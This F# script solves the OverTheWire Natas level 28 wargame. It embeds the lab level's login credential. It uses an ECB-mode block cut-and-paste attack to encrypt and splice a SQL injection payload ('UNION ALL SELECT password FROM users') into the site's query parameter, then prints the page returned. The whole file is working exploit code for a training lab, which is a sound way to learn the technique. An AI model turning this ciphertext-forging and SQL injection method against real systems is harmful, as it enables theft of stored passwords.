open System
open System.Net
open System.IO

let url = "http://natas28.natas.labs.overthewire.org/"
let credentials = "natas28:JWwR438wkgTsNKBbcJoowyysdM82YjeF"
let basicAuth = "Authorization: Basic " + Convert.ToBase64String (Seq.toArray (Seq.map byte credentials)) 

let blockSize, offsetSize, controlIndexStart = 16, 10, 3

let oracle (query: string) =
    let url = sprintf "%s?query=%s" url (WebUtility.UrlEncode(query))
    let http = HttpWebRequest.CreateHttp url
    http.Headers.Add(basicAuth)
    http.Method <- "HEAD"
    http.AllowAutoRedirect <- false

    let response =
        try
            http.GetResponse ()
        with | :? WebException as webEx ->
            webEx.Response
    let newUrl = response.Headers.["Location"]
    let query = WebUtility.UrlDecode(newUrl.Substring(newUrl.IndexOf("query=") + 6))
    Convert.FromBase64String query |> Array.chunkBySize blockSize

let toInject = "' UNION ALL SELECT password FROM users;#"
let paddedInject = toInject.PadRight ((blockSize * 3 - toInject.Length) + 1, ' ')

// step 1, get encoded with escaped slash
let injectQuery = String.replicate (offsetSize - 1) " " + paddedInject
let injectData = oracle injectQuery
let injectEncoded = Array.concat injectData.[controlIndexStart..]

// step 2, get prefix
let prefixQuery = String.replicate offsetSize " "
let prefixData = oracle prefixQuery
let prefixEncoded = Array.concat prefixData.[0..controlIndexStart - 1]

let cipher = 
    let bytes = Array.concat [prefixEncoded; injectEncoded]
    Convert.ToBase64String bytes

printfn "%s" (WebUtility.UrlEncode(cipher))

let finalUrl = sprintf "%ssearch.php?query=%s" url (WebUtility.UrlEncode(cipher))
let http = HttpWebRequest.CreateHttp finalUrl
http.Headers.Add(basicAuth)
let response = http.GetResponse ()
let stream = response.GetResponseStream ()
let reader = new StreamReader (stream)
let html = reader.ReadToEnd ()

printfn "%s" html